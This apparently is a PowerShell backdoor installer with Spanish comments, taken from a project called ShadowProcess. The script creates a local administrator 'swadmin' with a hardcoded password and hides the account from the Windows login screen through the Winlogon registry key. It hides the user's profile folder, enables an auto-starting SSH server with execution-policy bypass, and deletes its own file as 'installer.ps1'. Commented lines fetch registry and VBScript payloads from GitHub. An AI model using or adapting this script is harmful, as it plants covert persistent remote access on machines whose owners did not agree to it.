#Recursos

#String random nombre de directorios.
function random_text {
	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

#Variables 
#Creamos carpeta con nombre aleatorio
$initial_dir = $PWD.Path
$wd = random_text
$path = "$env:temp/$wd"


#Creando administrador local
function Create-NewLocalAdmin {
	[CmdletBinding()]
	param (
		[string]$NewLocalAdmin,
		[securestring]$Password
	)
	begin {
	}
	process {
		New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
		Write-Verbose "$NewLocalAdmin local user crated"
		Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
		Write-Verbose "$NewLocalAdmin added to the local administrator group"	
	}
	end{
	}
}

#Creando usuario administrador
$NewLocalAdmin = "swadmin"
$Password = (ConvertTo-SecureString "Melon123$!" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#Crear directorio en %temp%
mkdir $path
cd $path


#Instalando registro con script de teclas .vbs y .reg
#$reg_file = random_text 
#Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"
#script visual basic confirmar reg
#$vbs_file = random_text
#Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
#powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"

#Creacion de registro
Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' | New-Item -Name 'SpecialAccounts\UserList' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
cd $path


#Estableciendo persistencia ssh
powershell -windowstyle hidden -ep bypass Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'

#Ocultando usuario swadmin
cd C:\Users
attrib +h +s +r swadmin

#obteniendo ip (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
#obteniendo ip local (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Wi-Fi).IPAddress

#Autoeliminacion
cd $initial_dir
del .\installer.ps1